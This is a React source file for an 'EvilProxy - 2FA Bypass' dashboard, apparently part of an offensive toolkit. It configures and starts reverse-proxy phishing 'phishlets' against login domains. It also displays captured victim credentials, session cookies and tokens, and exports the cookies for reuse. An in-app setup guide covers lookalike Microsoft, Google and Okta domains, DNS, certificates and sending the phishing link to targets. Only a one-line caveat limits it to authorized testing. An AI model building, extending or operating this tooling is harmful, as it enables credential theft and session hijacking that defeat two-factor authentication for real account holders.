import { useEffect, useState, useCallback } from 'react'
import { api } from '../../services/api'
import { notify } from '../../hooks/useNotifications'
import {
  Phishlet,
  PhishletTemplate,
  CapturedProxySession,
  EvilProxyStats,
} from '../../types'
import {
  Shield,
  Play,
  Square,
  Trash2,
  Plus,
  RefreshCw,
  Copy,
  Download,
  Eye,
  X,
  Globe,
  Key,
  Cookie,
  CheckCircle,
  XCircle,
  Server,
  ArrowRight,
  Loader2,
  Settings,
  Zap,
} from 'lucide-react'

type TabType = 'phishlets' | 'sessions' | 'setup'

export default function EvilProxy() {
  const [activeTab, setActiveTab] = useState<TabType>('phishlets')
  const [isLoading, setIsLoading] = useState(false)

  // Data states
  const [phishlets, setPhishlets] = useState<Phishlet[]>([])
  const [templates, setTemplates] = useState<PhishletTemplate[]>([])
  const [sessions, setSessions] = useState<CapturedProxySession[]>([])
  const [stats, setStats] = useState<EvilProxyStats | null>(null)

  // Modal states
  const [showCreateModal, setShowCreateModal] = useState(false)
  const [showSessionModal, setShowSessionModal] = useState(false)
  const [selectedSession, setSelectedSession] = useState<CapturedProxySession | null>(null)
  const [startResult, setStartResult] = useState<{ proxy_url: string; instructions: string[] } | null>(null)

  // Fetch data
  const fetchPhishlets = useCallback(async () => {
    try {
      const data = await api.getPhishlets()
      setPhishlets(data.phishlets)
    } catch (error) {
      console.error('Failed to fetch phishlets:', error)
    }
  }, [])

  const fetchTemplates = useCallback(async () => {
    try {
      const data = await api.getPhishletTemplates()
      setTemplates(data.templates)
    } catch (error) {
      console.error('Failed to fetch templates:', error)
    }
  }, [])

  const fetchSessions = useCallback(async () => {
    try {
      const data = await api.getProxySessions()
      setSessions(data.sessions)
    } catch (error) {
      console.error('Failed to fetch sessions:', error)
    }
  }, [])

  const fetchStats = useCallback(async () => {
    try {
      const data = await api.getEvilProxyStats()
      setStats(data)
    } catch (error) {
      console.error('Failed to fetch stats:', error)
    }
  }, [])

  useEffect(() => {
    setIsLoading(true)
    Promise.all([
      fetchPhishlets(),
      fetchTemplates(),
      fetchSessions(),
      fetchStats(),
    ]).finally(() => setIsLoading(false))
  }, [fetchPhishlets, fetchTemplates, fetchSessions, fetchStats])

  // Actions
  const startPhishlet = async (phishlet: Phishlet) => {
    if (!phishlet.id) return
    try {
      const result = await api.startPhishlet(phishlet.id)
      setStartResult(result)
      notify.success('Phishlet Started', `${phishlet.name} is now running`)
      fetchPhishlets()
      fetchStats()
    } catch (error) {
      notify.error('Start Failed', 'Failed to start phishlet')
    }
  }

  const stopPhishlet = async (phishlet: Phishlet) => {
    if (!phishlet.id) return
    try {
      await api.stopPhishlet(phishlet.id)
      notify.info('Phishlet Stopped', `${phishlet.name} has been stopped`)
      fetchPhishlets()
      fetchStats()
    } catch (error) {
      notify.error('Stop Failed', 'Failed to stop phishlet')
    }
  }

  const deletePhishlet = async (phishlet: Phishlet) => {
    if (!phishlet.id || !confirm(`Delete phishlet "${phishlet.name}"?`)) return
    try {
      await api.deletePhishlet(phishlet.id)
      notify.success('Deleted', 'Phishlet removed')
      fetchPhishlets()
      fetchStats()
    } catch (error) {
      notify.error('Delete Failed', 'Failed to delete phishlet')
    }
  }

  const viewSession = (session: CapturedProxySession) => {
    setSelectedSession(session)
    setShowSessionModal(true)
  }

  const exportCookies = async (session: CapturedProxySession, format: 'json' | 'netscape' | 'header') => {
    if (!session.id) return
    try {
      const result = await api.exportSessionCookies(session.id, format)
      if (format === 'json') {
        navigator.clipboard.writeText(JSON.stringify(result.cookies, null, 2))
      } else {
        navigator.clipboard.writeText(result.content || '')
      }
      notify.success('Copied', `Cookies copied as ${format}`)
    } catch (error) {
      notify.error('Export Failed', 'Failed to export cookies')
    }
  }

  const tabs = [
    { id: 'phishlets' as TabType, label: 'Phishlets', icon: Shield, count: phishlets.length },
    { id: 'sessions' as TabType, label: 'Captured Sessions', icon: Key, count: sessions.length },
    { id: 'setup' as TabType, label: 'Setup Guide', icon: Settings },
  ]

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-white flex items-center gap-3">
            <Zap className="w-7 h-7 text-msf-yellow" />
            EvilProxy - 2FA Bypass
          </h1>
          <p className="text-gray-400 mt-1">
            Reverse proxy phishing for capturing session tokens after 2FA authentication
          </p>
        </div>
        <button
          onClick={() => {
            fetchPhishlets()
            fetchSessions()
            fetchStats()
          }}
          className="btn btn-secondary flex items-center gap-2"
          disabled={isLoading}
        >
          <RefreshCw className={`w-4 h-4 ${isLoading ? 'animate-spin' : ''}`} />
          Refresh
        </button>
      </div>

      {/* Stats Cards */}
      {stats && (
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
          <div className="bg-msf-card border border-msf-border rounded-lg p-4">
            <div className="flex items-center gap-3">
              <div className="p-2 bg-msf-blue/20 rounded-lg">
                <Shield className="w-5 h-5 text-msf-blue" />
              </div>
              <div>
                <p className="text-2xl font-bold text-white">{stats.running_phishlets}</p>
                <p className="text-sm text-gray-400">Active Phishlets</p>
              </div>
            </div>
          </div>
          <div className="bg-msf-card border border-msf-border rounded-lg p-4">
            <div className="flex items-center gap-3">
              <div className="p-2 bg-msf-green/20 rounded-lg">
                <CheckCircle className="w-5 h-5 text-msf-green" />
              </div>
              <div>
                <p className="text-2xl font-bold text-white">{stats.authenticated_sessions}</p>
                <p className="text-sm text-gray-400">2FA Bypassed</p>
              </div>
            </div>
          </div>
          <div className="bg-msf-card border border-msf-border rounded-lg p-4">
            <div className="flex items-center gap-3">
              <div className="p-2 bg-msf-purple/20 rounded-lg">
                <Key className="w-5 h-5 text-msf-purple" />
              </div>
              <div>
                <p className="text-2xl font-bold text-white">{stats.credentials_captured}</p>
                <p className="text-sm text-gray-400">Credentials</p>
              </div>
            </div>
          </div>
          <div className="bg-msf-card border border-msf-border rounded-lg p-4">
            <div className="flex items-center gap-3">
              <div className="p-2 bg-msf-yellow/20 rounded-lg">
                <Cookie className="w-5 h-5 text-msf-yellow" />
              </div>
              <div>
                <p className="text-2xl font-bold text-white">{stats.cookies_captured}</p>
                <p className="text-sm text-gray-400">Session Cookies</p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Network Flow Diagram */}
      <div className="bg-msf-card border border-msf-border rounded-lg p-6">
        <h3 className="text-sm font-medium text-gray-400 mb-4">Attack Flow</h3>
        <div className="flex items-center justify-center gap-4 text-sm">
          <div className="flex flex-col items-center">
            <div className="w-16 h-16 bg-msf-red/20 rounded-lg flex items-center justify-center mb-2">
              <Globe className="w-8 h-8 text-msf-red" />
            </div>
            <span className="text-white">Victim</span>
          </div>
          <ArrowRight className="w-6 h-6 text-gray-500" />
          <div className="flex flex-col items-center">
            <div className="w-16 h-16 bg-msf-yellow/20 rounded-lg flex items-center justify-center mb-2">
              <Server className="w-8 h-8 text-msf-yellow" />
            </div>
            <span className="text-white">Evil Proxy</span>
            <span className="text-xs text-gray-500">(Captures All)</span>
          </div>
          <ArrowRight className="w-6 h-6 text-gray-500" />
          <div className="flex flex-col items-center">
            <div className="w-16 h-16 bg-msf-green/20 rounded-lg flex items-center justify-center mb-2">
              <Shield className="w-8 h-8 text-msf-green" />
            </div>
            <span className="text-white">Real Server</span>
            <span className="text-xs text-gray-500">(+ 2FA)</span>
          </div>
        </div>
      </div>

      {/* Tabs */}
      <div className="bg-msf-card border border-msf-border rounded-lg overflow-hidden">
        <div className="flex border-b border-msf-border">
          {tabs.map((tab) => {
            const Icon = tab.icon
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center gap-2 px-6 py-3 text-sm font-medium transition-colors ${
                  activeTab === tab.id
                    ? 'text-white border-b-2 border-msf-accent bg-msf-darker'
                    : 'text-gray-400 hover:text-white'
                }`}
              >
                <Icon className="w-4 h-4" />
                {tab.label}
                {tab.count !== undefined && (
                  <span className="ml-1 px-2 py-0.5 text-xs bg-msf-dark rounded-full">
                    {tab.count}
                  </span>
                )}
              </button>
            )
          })}
        </div>

        {/* Phishlets Tab */}
        {activeTab === 'phishlets' && (
          <div className="p-6">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-lg font-semibold text-white">Phishlet Configurations</h2>
              <button
                onClick={() => setShowCreateModal(true)}
                className="btn btn-primary flex items-center gap-2"
              >
                <Plus className="w-4 h-4" />
                New Phishlet
              </button>
            </div>

            {/* Templates */}
            <div className="mb-8">
              <h3 className="text-sm font-medium text-gray-400 mb-3">Quick Start Templates</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                {templates.map((template) => (
                  <div
                    key={template.id}
                    className="bg-msf-darker border border-msf-border rounded-lg p-4 hover:border-msf-accent transition-colors"
                  >
                    <div className="flex items-start justify-between mb-2">
                      <h4 className="font-medium text-white">{template.name}</h4>
                    </div>
                    <p className="text-sm text-gray-400 mb-2">{template.description}</p>
                    <p className="text-xs text-gray-500 mb-3">
                      Target: {template.target_domain}
                    </p>
                    <div className="flex flex-wrap gap-1 mb-3">
                      {template.capture_cookies.slice(0, 3).map((cookie) => (
                        <span
                          key={cookie}
                          className="px-2 py-0.5 text-xs bg-msf-purple/20 text-msf-purple rounded"
                        >
                          {cookie}
                        </span>
                      ))}
                      {template.capture_cookies.length > 3 && (
                        <span className="px-2 py-0.5 text-xs bg-msf-dark text-gray-400 rounded">
                          +{template.capture_cookies.length - 3} more
                        </span>
                      )}
                    </div>
                    <button
                      onClick={async () => {
                        const phishingDomain = prompt(
                          'Enter your phishing domain:',
                          template.phishing_domain.replace('{YOUR_DOMAIN}', 'attacker.com')
                        )
                        if (phishingDomain) {
                          try {
                            await api.createPhishlet({
                              name: template.name,
                              description: template.description,
                              target_domain: template.target_domain,
                              phishing_domain: phishingDomain,
                              proxy_port: 443,
                              ssl_enabled: true,
                              capture_cookies: template.capture_cookies,
                              capture_fields: template.capture_fields,
                              auth_urls: template.auth_urls,
                              replacements: template.replacements,
                            })
                            notify.success('Created', `Phishlet "${template.name}" created`)
                            fetchPhishlets()
                          } catch (error) {
                            notify.error('Error', 'Failed to create phishlet')
                          }
                        }
                      }}
                      className="text-sm text-msf-blue hover:text-msf-blue/80"
                    >
                      Use Template
                    </button>
                  </div>
                ))}
              </div>
            </div>

            {/* Active Phishlets */}
            <div>
              <h3 className="text-sm font-medium text-gray-400 mb-3">Your Phishlets</h3>
              {phishlets.length === 0 ? (
                <div className="text-center py-12 text-gray-500">
                  <Shield className="w-16 h-16 mx-auto mb-4 opacity-50" />
                  <p>No phishlets configured yet</p>
                  <p className="text-sm mt-1">Create one from a template above</p>
                </div>
              ) : (
                <div className="space-y-4">
                  {phishlets.map((phishlet) => (
                    <div
                      key={phishlet.id}
                      className="bg-msf-darker border border-msf-border rounded-lg p-4"
                    >
                      <div className="flex items-start justify-between">
                        <div className="flex items-center gap-3">
                          <div
                            className={`w-3 h-3 rounded-full ${
                              phishlet.status === 'running'
                                ? 'bg-msf-green animate-pulse'
                                : 'bg-gray-500'
                            }`}
                          />
                          <div>
                            <h4 className="font-medium text-white">{phishlet.name}</h4>
                            <p className="text-sm text-gray-400">
                              {phishlet.phishing_domain} → {phishlet.target_domain}
                            </p>
                          </div>
                        </div>
                        <div className="flex items-center gap-2">
                          {phishlet.status === 'running' ? (
                            <button
                              onClick={() => stopPhishlet(phishlet)}
                              className="btn btn-secondary flex items-center gap-2"
                            >
                              <Square className="w-4 h-4" />
                              Stop
                            </button>
                          ) : (
                            <button
                              onClick={() => startPhishlet(phishlet)}
                              className="btn btn-primary flex items-center gap-2"
                            >
                              <Play className="w-4 h-4" />
                              Start
                            </button>
                          )}
                          <button
                            onClick={() => deletePhishlet(phishlet)}
                            className="p-2 text-gray-400 hover:text-msf-red"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </div>
                      </div>
                      <div className="mt-3 flex flex-wrap gap-2">
                        <span className="px-2 py-1 text-xs bg-msf-dark text-gray-400 rounded">
                          Port: {phishlet.proxy_port}
                        </span>
                        <span className="px-2 py-1 text-xs bg-msf-dark text-gray-400 rounded">
                          Cookies: {phishlet.capture_cookies.length}
                        </span>
                        <span className="px-2 py-1 text-xs bg-msf-dark text-gray-400 rounded">
                          Fields: {phishlet.capture_fields.length}
                        </span>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        )}

        {/* Sessions Tab */}
        {activeTab === 'sessions' && (
          <div className="p-6">
            <h2 className="text-lg font-semibold text-white mb-6">Captured Sessions</h2>

            {sessions.length === 0 ? (
              <div className="text-center py-12 text-gray-500">
                <Key className="w-16 h-16 mx-auto mb-4 opacity-50" />
                <p>No sessions captured yet</p>
                <p className="text-sm mt-1">Start a phishlet and wait for victims</p>
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="border-b border-msf-border">
                      <th className="text-left py-3 px-4 text-gray-400 font-medium">Status</th>
                      <th className="text-left py-3 px-4 text-gray-400 font-medium">Victim IP</th>
                      <th className="text-left py-3 px-4 text-gray-400 font-medium">Credentials</th>
                      <th className="text-left py-3 px-4 text-gray-400 font-medium">Cookies</th>
                      <th className="text-left py-3 px-4 text-gray-400 font-medium">Captured At</th>
                      <th className="text-left py-3 px-4 text-gray-400 font-medium">Actions</th>
                    </tr>
                  </thead>
                  <tbody>
                    {sessions.map((session) => (
                      <tr
                        key={session.id}
                        className="border-b border-msf-border/50 hover:bg-msf-darker"
                      >
                        <td className="py-3 px-4">
                          {session.authenticated ? (
                            <span className="flex items-center gap-1 text-msf-green">
                              <CheckCircle className="w-4 h-4" />
                              2FA Bypassed
                            </span>
                          ) : (
                            <span className="flex items-center gap-1 text-gray-400">
                              <XCircle className="w-4 h-4" />
                              Partial
                            </span>
                          )}
                        </td>
                        <td className="py-3 px-4 text-white font-mono">{session.victim_ip}</td>
                        <td className="py-3 px-4">
                          {Object.keys(session.credentials).length > 0 ? (
                            <span className="text-msf-green">
                              {Object.keys(session.credentials).length} captured
                            </span>
                          ) : (
                            <span className="text-gray-500">-</span>
                          )}
                        </td>
                        <td className="py-3 px-4">
                          {Object.keys(session.cookies).length > 0 ? (
                            <span className="text-msf-yellow">
                              {Object.keys(session.cookies).length} cookies
                            </span>
                          ) : (
                            <span className="text-gray-500">-</span>
                          )}
                        </td>
                        <td className="py-3 px-4 text-gray-400">
                          {new Date(session.captured_at).toLocaleString()}
                        </td>
                        <td className="py-3 px-4">
                          <div className="flex items-center gap-2">
                            <button
                              onClick={() => viewSession(session)}
                              className="p-1 text-gray-400 hover:text-white"
                              title="View Details"
                            >
                              <Eye className="w-4 h-4" />
                            </button>
                            <button
                              onClick={() => exportCookies(session, 'header')}
                              className="p-1 text-gray-400 hover:text-white"
                              title="Copy as Cookie Header"
                            >
                              <Copy className="w-4 h-4" />
                            </button>
                            <button
                              onClick={() => exportCookies(session, 'json')}
                              className="p-1 text-gray-400 hover:text-white"
                              title="Export JSON"
                            >
                              <Download className="w-4 h-4" />
                            </button>
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}

        {/* Setup Guide Tab */}
        {activeTab === 'setup' && (
          <div className="p-6">
            <h2 className="text-lg font-semibold text-white mb-6">Setup Guide</h2>

            <div className="space-y-6">
              <div className="bg-msf-darker border border-msf-border rounded-lg p-4">
                <h3 className="font-medium text-white mb-3">1. Domain Setup</h3>
                <p className="text-gray-400 text-sm mb-2">
                  Configure a domain that looks similar to your target. Examples:
                </p>
                <ul className="list-disc list-inside text-sm text-gray-400 space-y-1">
                  <li>login-microsoft.yourdomain.com (for Microsoft 365)</li>
                  <li>accounts-google.yourdomain.com (for Google)</li>
                  <li>company-okta.yourdomain.com (for Okta)</li>
                </ul>
              </div>

              <div className="bg-msf-darker border border-msf-border rounded-lg p-4">
                <h3 className="font-medium text-white mb-3">2. DNS Configuration</h3>
                <p className="text-gray-400 text-sm mb-2">
                  Point your phishing domain to your server's IP:
                </p>
                <code className="block bg-msf-dark p-3 rounded text-sm text-msf-green">
                  login-microsoft.yourdomain.com  A  YOUR_SERVER_IP
                </code>
              </div>

              <div className="bg-msf-darker border border-msf-border rounded-lg p-4">
                <h3 className="font-medium text-white mb-3">3. SSL Certificate</h3>
                <p className="text-gray-400 text-sm mb-2">
                  Generate an SSL certificate for your phishing domain:
                </p>
                <code className="block bg-msf-dark p-3 rounded text-sm text-msf-green">
                  certbot certonly --standalone -d login-microsoft.yourdomain.com
                </code>
              </div>

              <div className="bg-msf-darker border border-msf-border rounded-lg p-4">
                <h3 className="font-medium text-white mb-3">4. Start the Proxy</h3>
                <p className="text-gray-400 text-sm">
                  Create a phishlet from the templates above, configure your domain, and click Start.
                  The proxy will intercept all traffic and capture credentials and session cookies.
                </p>
              </div>

              <div className="bg-msf-darker border border-msf-border rounded-lg p-4">
                <h3 className="font-medium text-white mb-3">5. Send Phishing Link</h3>
                <p className="text-gray-400 text-sm mb-2">
                  Send the phishing URL to your target. When they authenticate (including 2FA),
                  their session cookies are captured.
                </p>
                <div className="bg-msf-yellow/10 border border-msf-yellow/30 rounded p-3 mt-3">
                  <p className="text-msf-yellow text-sm">
                    <strong>Important:</strong> Only use this tool in authorized penetration testing engagements.
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Create Phishlet Modal */}
      {showCreateModal && (
        <CreatePhishletModal
          onClose={() => setShowCreateModal(false)}
          onCreate={async (phishlet) => {
            try {
              await api.createPhishlet(phishlet)
              notify.success('Created', 'Phishlet created successfully')
              fetchPhishlets()
              setShowCreateModal(false)
            } catch (error) {
              notify.error('Error', 'Failed to create phishlet')
            }
          }}
        />
      )}

      {/* Session Detail Modal */}
      {showSessionModal && selectedSession && (
        <SessionDetailModal
          session={selectedSession}
          onClose={() => {
            setShowSessionModal(false)
            setSelectedSession(null)
          }}
          onExport={(format) => exportCookies(selectedSession, format)}
        />
      )}

      {/* Start Result Modal */}
      {startResult && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
          <div className="bg-msf-card border border-msf-border rounded-lg w-full max-w-lg">
            <div className="p-4 border-b border-msf-border flex items-center justify-between">
              <h3 className="text-lg font-semibold text-white">Phishlet Started</h3>
              <button
                onClick={() => setStartResult(null)}
                className="text-gray-400 hover:text-white"
              >
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="p-4 space-y-4">
              <div>
                <p className="text-sm text-gray-400 mb-1">Proxy URL:</p>
                <code className="block bg-msf-dark p-2 rounded text-msf-green text-sm break-all">
                  {startResult.proxy_url}
                </code>
              </div>
              <div>
                <p className="text-sm text-gray-400 mb-2">Setup Instructions:</p>
                <ol className="list-decimal list-inside text-sm text-white space-y-2">
                  {startResult.instructions.map((instruction, i) => (
                    <li key={i}>{instruction}</li>
                  ))}
                </ol>
              </div>
            </div>
            <div className="p-4 border-t border-msf-border flex justify-end">
              <button onClick={() => setStartResult(null)} className="btn btn-primary">
                Got it
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

// ============== Sub-components ==============

function CreatePhishletModal({
  onClose,
  onCreate,
}: {
  onClose: () => void
  onCreate: (phishlet: Omit<Phishlet, 'id' | 'created_at' | 'status'>) => void
}) {
  const [name, setName] = useState('')
  const [targetDomain, setTargetDomain] = useState('')
  const [phishingDomain, setPhishingDomain] = useState('')
  const [proxyPort, setProxyPort] = useState(443)
  const [captureCookies, setCaptureCookies] = useState('')
  const [captureFields, setCaptureFields] = useState('username,password,email')
  const [authUrls, setAuthUrls] = useState('')

  return (
    <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
      <div className="bg-msf-card border border-msf-border rounded-lg w-full max-w-lg max-h-[90vh] overflow-y-auto">
        <div className="p-4 border-b border-msf-border flex items-center justify-between">
          <h3 className="text-lg font-semibold text-white">Create Phishlet</h3>
          <button onClick={onClose} className="text-gray-400 hover:text-white">
            <X className="w-5 h-5" />
          </button>
        </div>
        <div className="p-4 space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-400 mb-1">Name</label>
            <input
              type="text"
              value={name}
              onChange={(e) => setName(e.target.value)}
              placeholder="My Phishlet"
              className="w-full bg-msf-dark border border-msf-border rounded px-3 py-2 text-white"
            />
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-400 mb-1">Target Domain</label>
            <input
              type="text"
              value={targetDomain}
              onChange={(e) => setTargetDomain(e.target.value)}
              placeholder="login.example.com"
              className="w-full bg-msf-dark border border-msf-border rounded px-3 py-2 text-white"
            />
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-400 mb-1">Phishing Domain</label>
            <input
              type="text"
              value={phishingDomain}
              onChange={(e) => setPhishingDomain(e.target.value)}
              placeholder="login-example.attacker.com"
              className="w-full bg-msf-dark border border-msf-border rounded px-3 py-2 text-white"
            />
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-400 mb-1">Proxy Port</label>
            <input
              type="number"
              value={proxyPort}
              onChange={(e) => setProxyPort(parseInt(e.target.value))}
              className="w-full bg-msf-dark border border-msf-border rounded px-3 py-2 text-white"
            />
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-400 mb-1">
              Cookies to Capture (comma-separated)
            </label>
            <input
              type="text"
              value={captureCookies}
              onChange={(e) => setCaptureCookies(e.target.value)}
              placeholder="session_id, auth_token, JSESSIONID"
              className="w-full bg-msf-dark border border-msf-border rounded px-3 py-2 text-white"
            />
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-400 mb-1">
              Form Fields to Capture (comma-separated)
            </label>
            <input
              type="text"
              value={captureFields}
              onChange={(e) => setCaptureFields(e.target.value)}
              placeholder="username, password, email"
              className="w-full bg-msf-dark border border-msf-border rounded px-3 py-2 text-white"
            />
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-400 mb-1">
              Auth URLs (comma-separated paths that indicate authentication)
            </label>
            <input
              type="text"
              value={authUrls}
              onChange={(e) => setAuthUrls(e.target.value)}
              placeholder="/login, /authenticate, /oauth"
              className="w-full bg-msf-dark border border-msf-border rounded px-3 py-2 text-white"
            />
          </div>
        </div>
        <div className="p-4 border-t border-msf-border flex justify-end gap-3">
          <button onClick={onClose} className="btn btn-secondary">
            Cancel
          </button>
          <button
            onClick={() => {
              if (name && targetDomain && phishingDomain) {
                onCreate({
                  name,
                  target_domain: targetDomain,
                  phishing_domain: phishingDomain,
                  proxy_port: proxyPort,
                  ssl_enabled: true,
                  capture_cookies: captureCookies.split(',').map((s) => s.trim()).filter(Boolean),
                  capture_fields: captureFields.split(',').map((s) => s.trim()).filter(Boolean),
                  auth_urls: authUrls.split(',').map((s) => s.trim()).filter(Boolean),
                  replacements: {},
                })
              }
            }}
            disabled={!name || !targetDomain || !phishingDomain}
            className="btn btn-primary"
          >
            Create
          </button>
        </div>
      </div>
    </div>
  )
}

function SessionDetailModal({
  session,
  onClose,
  onExport,
}: {
  session: CapturedProxySession
  onClose: () => void
  onExport: (format: 'json' | 'netscape' | 'header') => void
}) {
  return (
    <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
      <div className="bg-msf-card border border-msf-border rounded-lg w-full max-w-2xl max-h-[90vh] overflow-y-auto">
        <div className="p-4 border-b border-msf-border flex items-center justify-between">
          <div>
            <h3 className="text-lg font-semibold text-white">Session Details</h3>
            <p className="text-sm text-gray-400">{session.victim_ip}</p>
          </div>
          <button onClick={onClose} className="text-gray-400 hover:text-white">
            <X className="w-5 h-5" />
          </button>
        </div>
        <div className="p-4 space-y-6">
          {/* Status */}
          <div className="flex items-center gap-2">
            {session.authenticated ? (
              <span className="flex items-center gap-2 px-3 py-1 bg-msf-green/20 text-msf-green rounded-full text-sm">
                <CheckCircle className="w-4 h-4" />
                2FA Successfully Bypassed
              </span>
            ) : (
              <span className="flex items-center gap-2 px-3 py-1 bg-gray-500/20 text-gray-400 rounded-full text-sm">
                <XCircle className="w-4 h-4" />
                Partial Capture
              </span>
            )}
          </div>

          {/* Credentials */}
          {Object.keys(session.credentials).length > 0 && (
            <div>
              <h4 className="text-sm font-medium text-gray-400 mb-2 flex items-center gap-2">
                <Key className="w-4 h-4" />
                Captured Credentials
              </h4>
              <div className="bg-msf-darker rounded-lg p-3 space-y-2">
                {Object.entries(session.credentials).map(([key, value]) => (
                  <div key={key} className="flex justify-between">
                    <span className="text-gray-400">{key}:</span>
                    <code className="text-msf-red">{value}</code>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Cookies */}
          {Object.keys(session.cookies).length > 0 && (
            <div>
              <h4 className="text-sm font-medium text-gray-400 mb-2 flex items-center gap-2">
                <Cookie className="w-4 h-4" />
                Session Cookies
              </h4>
              <div className="bg-msf-darker rounded-lg p-3 space-y-2 max-h-60 overflow-y-auto">
                {Object.entries(session.cookies).map(([key, value]) => (
                  <div key={key} className="flex flex-col">
                    <span className="text-msf-yellow text-sm">{key}</span>
                    <code className="text-xs text-gray-400 break-all">{value}</code>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Tokens */}
          {Object.keys(session.tokens).length > 0 && (
            <div>
              <h4 className="text-sm font-medium text-gray-400 mb-2">Auth Tokens</h4>
              <div className="bg-msf-darker rounded-lg p-3 space-y-2">
                {Object.entries(session.tokens).map(([key, value]) => (
                  <div key={key} className="flex flex-col">
                    <span className="text-msf-purple text-sm">{key}</span>
                    <code className="text-xs text-gray-400 break-all">{value}</code>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* User Agent */}
          <div>
            <h4 className="text-sm font-medium text-gray-400 mb-2">User Agent</h4>
            <code className="text-xs text-gray-400 block bg-msf-darker p-2 rounded break-all">
              {session.user_agent}
            </code>
          </div>

          {/* Export Options */}
          <div>
            <h4 className="text-sm font-medium text-gray-400 mb-2">Export Cookies</h4>
            <div className="flex gap-2">
              <button
                onClick={() => onExport('header')}
                className="btn btn-secondary text-sm"
              >
                As Cookie Header
              </button>
              <button
                onClick={() => onExport('json')}
                className="btn btn-secondary text-sm"
              >
                As JSON
              </button>
              <button
                onClick={() => onExport('netscape')}
                className="btn btn-secondary text-sm"
              >
                Netscape Format
              </button>
            </div>
          </div>
        </div>
        <div className="p-4 border-t border-msf-border flex justify-end">
          <button onClick={onClose} className="btn btn-primary">
            Close
          </button>
        </div>
      </div>
    </div>
  )
}
